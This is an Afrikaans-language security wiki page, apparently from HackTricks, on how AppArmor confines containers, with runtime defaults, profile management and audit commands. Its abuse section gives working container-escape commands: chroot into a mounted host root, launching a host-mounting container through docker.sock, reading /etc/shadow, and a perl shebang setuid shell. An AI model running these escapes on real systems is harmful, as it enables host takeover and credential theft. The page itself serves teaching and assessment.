# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is 'n **Verpligte Toegangsbeheer**-stelsel wat beperkings toepas deur per-program profiele. Anders as tradisionele DAC-kontroles, wat swaar afhanklik is van gebruiker- en groepseienaarskap, laat AppArmor die kernel 'n beleid afdwing wat aan die proses self gekoppel is. In container-omgewings maak dit saak omdat 'n workload dalk genoeg tradisionele voorregte het om 'n aksie te probeer en steeds geweier kan word omdat sy AppArmor-profiel nie die relevante path, mount, netwerkgedrag, of capability gebruik toelaat nie.

Die belangrikste konseptuele punt is dat AppArmor **path-based** is. Dit redeneer oor toegang tot die filesystem deur path rules eerder as deur labels soos SELinux doen. Dit maak dit toeganklik en kragtig, maar dit beteken ook dat bind mounts en alternate path layouts noukeurige aandag verdien. As dieselfde host-inhoud onder 'n ander path bereikbaar word, mag die effek van die beleid nie wees wat die operator aanvanklik verwag het nie.

## Rol in container isolasie

Container sekuriteitsbeoordelings stop dikwels by capabilities en seccomp, maar AppArmor bly saak maak ná daardie kontroles. Stel jou 'n container voor wat meer voorregte het as wat dit behoort te hê, of 'n workload wat vir operasionele redes een ekstra capability nodig gehad het. AppArmor kan steeds file access, mount behavior, networking, en execution patterns beperk op maniere wat die voor die hand liggende abuse path stop. Dit is waarom om AppArmor te deaktiveer "just to get the application working" stilweg 'n slegs riskante konfigurasie in een wat aktief uitgebuit kan word, kan omskakel.

## Lab

Om te kontroleer of AppArmor op die host aktief is, gebruik:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Om te sien onder watter gebruiker die huidige containerproses loop:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Die verskil is insiggewend. In die normale geval behoort die proses 'n AppArmor-konteks te toon wat gekoppel is aan die profiel wat deur die runtime gekies is. In die unconfined geval verdwyn daardie ekstra beperkingslaag.

Jy kan ook nagaan wat Docker dink dit toegepas het:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime-gebruik

Docker kan 'n standaard of pasgemaakte AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook met AppArmor integreer op AppArmor-gebaseerde stelsels, alhoewel op SELinux-eerst verspreidings die ander MAC-stelsel dikwels die primêre rol speel. Kubernetes kan AppArmor-beleid op die workload-vlak openbaar maak op nodes wat wel AppArmor ondersteun. LXC en verwante Ubuntu-family system-container-omgewings gebruik AppArmor ook wyd.

Die praktiese punt is dat AppArmor nie 'n "Docker feature" is nie. Dit is 'n gasheer-kernfunksie wat verskeie runtimes kan kies om toe te pas. As die gasheer dit nie ondersteun nie of die runtime word gesê om unconfined te hardloop, is die veronderstelde beskerming nie regtig daar nie.

Vir Kubernetes spesifiek is die moderne API `securityContext.appArmorProfile`. Sedert Kubernetes `v1.30` is die ouer beta AppArmor-annotasies verouderd. Op ondersteunende hosts is `RuntimeDefault` die standaardprofiel, terwyl `Localhost` na 'n profiel wys wat reeds op die node gelaai moet wees. Dit maak saak tydens hersiening omdat 'n manifest AppArmor-bewus kan lyk terwyl dit steeds heeltemal afhanklik is van node-kant ondersteuning en vooraf gelaaide profiles.

Een fyn maar nuttige operasionele detail is dat dit eksplisiet stel van `appArmorProfile.type: RuntimeDefault` strenger is as om die veld eenvoudig weg te laat. As die veld eksplisiet gestel is en die node ondersteun nie AppArmor nie, behoort toelating te misluk. As die veld weggelaat word, kan die workload steeds op 'n node sonder AppArmor hardloop en net daardie ekstra beperkende laag nie ontvang nie. Vanuit 'n aanvaller se oogpunt is dit 'n goeie rede om beide die manifest en die werklike node-toestand na te gaan.

Op AppArmor-hosts wat Docker-ondersteuning het, is die beste bekende standaard `docker-default`. Daardie profiel word gegenereer vanaf Moby se AppArmor-template en is belangrik omdat dit verduidelik waarom sommige capability-based PoCs steeds in 'n standaard kontaineer misluk. In breë terme laat `docker-default` gewone netwerking toe, weier dit skrywe na baie van `/proc`, weier dit toegang tot sensitiewe dele van `/sys`, blokkeer dit mount-operasies, en beperk dit ptrace sodat dit nie 'n algemene gasheer-opspoorprimitive is nie. Om daardie basislyn te verstaan help om te onderskei tussen "die kontaineer het `CAP_SYS_ADMIN`" en "die kontaineer kan daardie bevoegdheid werklik teen die kernkoppelvlakke gebruik waarop ek omgee".

## Profielbestuur

AppArmor-profiele word gewoonlik gestoor onder `/etc/apparmor.d/`. 'n Algemene naamkonvensie is om skuinsstrepe in die uitvoerbare pad met kolletjies te vervang. Byvoorbeeld, 'n profiel vir `/usr/bin/man` word gewoonlik gestoor as `/etc/apparmor.d/usr.bin.man`. Hierdie detail maak saak tydens beide verdediging en beoordeling omdat sodra jy die aktiewe profielnaam ken, jy dikwels die ooreenstemmende lêer vinnig op die gasheer kan opspoor.

Nuttige gasheer-kant bestuursopdragte sluit in:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Die rede waarom hierdie opdragte saak maak in 'n container-security verwysing, is dat hulle verduidelik hoe profiele eintlik opgebou, gelaai, na complain mode geskakel en ná toepassingsveranderinge gewysig word. As 'n operator die gewoonte het om profiele tydens foutopsporing na complain mode te skuif en vergeet om die afdwinging te herstel, mag die container in dokumentasie beskerm lyk terwyl dit in werklikheid baie losser optree.

### Bou en Bywerking van Profiele

`aa-genprof` kan toepassingsgedrag waarneem en help om 'n profiel interaktief te genereer:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kan 'n sjabloonprofiel genereer wat later met `apparmor_parser` gelaai kan word:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
As die binêre verander en die beleid opgedateer moet word, kan `aa-logprof` weierings wat in die loglêers gevind is naspeel en die operateur help om te besluit of om dit toe te laat of te weier:
```bash
sudo aa-logprof
```
### Logboeke

Weierings deur AppArmor is dikwels sigbaar via `auditd`, syslog, of gereedskap soos `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Dit is nuttig operasioneel en offensief. Verdedigers gebruik dit om profiele te verfyn. Aanvallers gebruik dit om te bepaal watter presiese pad of operasie geweier word en of AppArmor die beheer is wat 'n exploit chain blokkeer.

### Identifisering van die presiese profiellêer

Wanneer 'n runtime 'n spesifieke AppArmor-profielnaam vir 'n container wys, is dit dikwels nuttig om daardie naam terug te koppel na die profiellêer op die skyf:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dit is veral nuttig tydens host-side beoordeling omdat dit die gaping oorbrug tussen "the container says it is running under profile `lowpriv`" en "the actual rules live in this specific file that can be audited or reloaded".

### Reëls met hoë seinwaarde om te oudit

Wanneer jy 'n profiel kan lees, hou nie by eenvoudige `deny`-reëls op nie. Verskeie tipe reëls verander beduidend hoe nuttig AppArmor teen 'n container escape-poging sal wees:

- `ux` / `Ux`: voer die teiken-binary unconfined uit. As 'n toeganklike helper, shell, of interpreter onder `ux` toegelaat word, is dit gewoonlik die eerste ding om te toets.
- `px` / `Px` and `cx` / `Cx`: voer profiel-oorskakelings uit op exec. Dit is nie outomaties sleg nie, maar dit is die moeite werd om te oudit omdat 'n oorskakeling in 'n veel breër profiel as die huidige kan beland.
- `change_profile`: laat 'n taak toe om na 'n ander gelaaide profiel te skakel, onmiddellik of by die volgende exec. As die bestemmingprofiel swakker is, kan dit die beoogde ontsnappingsuitweg uit 'n beperkende domein word.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: hierdie behoort te verander hoeveel vertroue jy in die profiel plaas. `complain` log weierings in plaas daarvan om dit af te dwing, `unconfined` verwyder die grens, en `prompt` hang af van 'n userspace-besluitpad eerder as 'n suiwer deur die kernel-afgedwonge deny.
- `userns` or `userns create,`: nuwere AppArmor-beleid kan die skepping van user namespaces bemiddel. As 'n container profiel dit eksplisiet toelaat, bly geneste user namespaces in werking selfs wanneer die platform AppArmor as deel van sy hardening-strategie gebruik.

Nuttige host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Hierdie soort oudit is dikwels nuttiger as om na honderde gewone lêerreëls te staar. As 'n breakout afhang van die uitvoering van 'n helper, die binnetree van 'n nuwe namespace, of die ontsnapping na 'n minder beperkende profiel, is die antwoord dikwels weggesteek in hierdie oorgangsgeoriënteerde reëls eerder as in die voor die hand liggende `deny /etc/shadow r`-styl reëls.

## Miskonfigurasies

Die mees voor die hand liggende fout is `apparmor=unconfined`. Administrateurs stel dit dikwels in terwyl hulle 'n toepassing debug wat misluk het omdat die profiel korrek iets gevaarliks of onverwagts geblokkeer het. As die vlag in produksie bly, is die hele MAC-laag effektief verwyder.

Nog 'n subtiele probleem is om aan te neem dat bind mounts onskadelik is omdat die lêertowissings normaal lyk. Aangesien AppArmor padgebaseer is, kan die blootstelling van host-paaie onder alternatiewe mount-lokasies sleg met padreëls interakteer. Nog 'n fout is om te vergeet dat 'n profielnaam in 'n konfigurasielêer min beteken as die host-kern nie eintlik AppArmor afdwing nie.

## Misbruik

Wanneer AppArmor weg is, mag operasies wat voorheen beperk was skielik werk: lees van sensitiewe paaie deur bind mounts, toegang tot gedeeltes van procfs of sysfs wat moeilik­er moes bly om te gebruik, die uitvoering van mount-verwante aksies as capabilities/seccomp dit ook toelaat, of die gebruik van paaie wat 'n profiel normaalweg sou weier. AppArmor is dikwels die meganisme wat verduidelik waarom 'n capability-gebaseerde breakout-poging op papier behoort te werk maar steeds in die praktyk misluk. Verwyder AppArmor, en dieselfde poging kan begin slaag.

As jy vermoed AppArmor is die hoofrede wat 'n path-traversal, bind-mount, of mount-gebaseerde misbruikketting stop, is die eerste stap gewoonlik om te vergelyk wat toeganklik word met en sonder 'n profiel. Byvoorbeeld, as 'n host-path binne die container gemount is, begin deur te kontroleer of jy dit kan traverseer en lees:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
As die container ook 'n gevaarlike bevoegdheid soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om te kyk of AppArmor die beheer is wat mount operations of toegang tot sensitiewe kernel filesystems blokkeer:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In omgewings waar 'n host path reeds beskikbaar is via 'n bind mount, kan die verlies van AppArmor ook 'n read-only information-disclosure-kwessie omskep in direkte host file access:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Die punt van hierdie opdragte is nie dat AppArmor op sigself die breakout veroorsaak nie. Dit is dat sodra AppArmor verwyder is, baie filesystem- en mount-gebaseerde misbruikpaaie onmiddellik toetsbaar raak.

### Volledige voorbeeld: AppArmor Disabled + Host Root Mounted

As die container reeds die host root bind-mounted by `/host` het, kan die verwydering van AppArmor 'n geblokkeerde filesystem-misbruikpad omskep in 'n volledige host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sodra die shell deur die host filesystem uitgevoer word, het die workload effektief die container boundary ontsnap:
```bash
id
hostname
cat /etc/shadow | head
```
### Volledige Voorbeeld: AppArmor Uitgeskakel + Runtime Socket

As die werklike hindernis AppArmor rondom die runtime state was, kan 'n gemonteerde socket voldoende wees vir 'n volledige ontsnapping:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Die presiese pad hang af van die mount point, maar die eindresultaat is dieselfde: AppArmor keer nie meer toegang tot die runtime API af nie, en die runtime API kan 'n host-compromising container lanseer.

### Volledige Voorbeeld: Path-Based Bind-Mount Bypass

Omdat AppArmor path-based is, beskerm die afdwinging van `/proc/**` nie outomaties dieselfde host procfs-inhoud as dit via 'n ander pad bereikbaar is nie:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die impak hang af van wat presies gemount is en of die alternatiewe pad ook ander kontroles omseil, maar hierdie patroon is een van die duidelikste redes waarom AppArmor saam met mount layout, en nie geïsoleerd, geëvalueer moet word nie.

### Volledige Voorbeeld: Shebang Bypass

AppArmor-beleid mik soms op 'n interpreter pad op 'n manier wat nie ten volle rekening hou met script-uitvoering deur shebang handling nie. 'n Historiese voorbeeld het behels die gebruik van 'n script waarvan die eerste lyn na 'n confined interpreter wys:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Hierdie soort voorbeeld is belangrik as 'n herinnering dat profile intent en werklike uitvoeringssemantiek kan uiteenloop. Wanneer AppArmor in container-omgewings nagegaan word, verdien interpreter chains en alternate execution paths besondere aandag.

## Kontroles

Die doel van hierdie kontroles is om vinnig drie vrae te beantwoord: is AppArmor op die host geaktiveer, is die huidige process gekonfineer, en het die runtime werklik 'n profile op hierdie container toegepas?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Wat interessant is:

- As `/proc/self/attr/current` `unconfined` wys, kry die workload nie voordeel uit AppArmor-konfinering nie.
- As `aa-status` AppArmor as gedeaktiveer of nie gelaai wys, is enige profienaam in die runtime-konfig meestal kosmeties.
- As `docker inspect` `unconfined` of 'n onverwagte pasgemaakte profiel wys, is dit dikwels die rede waarom 'n filesystem- of mount-gebaseerde misbruikpad werk.
- As `/sys/kernel/security/apparmor/profiles` nie die profiel bevat wat jy verwag het nie, is die runtime- of orchestrator-konfigurasie op sigself nie genoeg nie.
- As 'n veronderstelde geharde profiel `ux`, wydswep `change_profile`, `userns`, of `flags=(complain)` styl-reëls bevat, kan die praktiese grens baie swakker wees as wat die profienaam aandui.

As 'n container reeds verhoogde voorregte vir operasionele redes het, maak dit dikwels 'n verskil om AppArmor aangeskakel te laat tussen 'n beheerde uitsondering en 'n baie wyer sekuriteitsversuim.

## Runtime-standaarde

| Runtime / platform | Standaardtoestand | Standaardgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Standaard geaktiveer op hosts wat AppArmor ondersteun | Gebruik die `docker-default` AppArmor-profiel tensy oorskryf | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-afhanklik | AppArmor word deur `--security-opt` ondersteun, maar die presiese standaard is host-/runtime-afhanklik en minder universeel as Docker se gedokumenteerde `docker-default` profiel | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Voorwaardelike standaard | As `appArmorProfile.type` nie gespesifiseer is nie, is die standaard `RuntimeDefault`, maar dit word slegs toegepas wanneer AppArmor op die node geaktiveer is | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` met 'n swak profiel, nodes sonder AppArmor-ondersteuning |
| containerd / CRI-O under Kubernetes | Volg node-/runtime-ondersteuning | Algemene Kubernetes-ondersteunde runtimes ondersteun AppArmor, maar werklike handhawing hang steeds af van node-ondersteuning en workload-instellings | Dieselfde as in die Kubernetes-ry; direkte runtime-konfigurasie kan ook AppArmor heeltemal oorslaan |

Vir AppArmor is die belangrikste veranderlike dikwels die **host**, nie net die runtime nie. 'n Profielinstelling in 'n manifest skep nie konfinering op 'n node waar AppArmor nie geaktiveer is nie.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
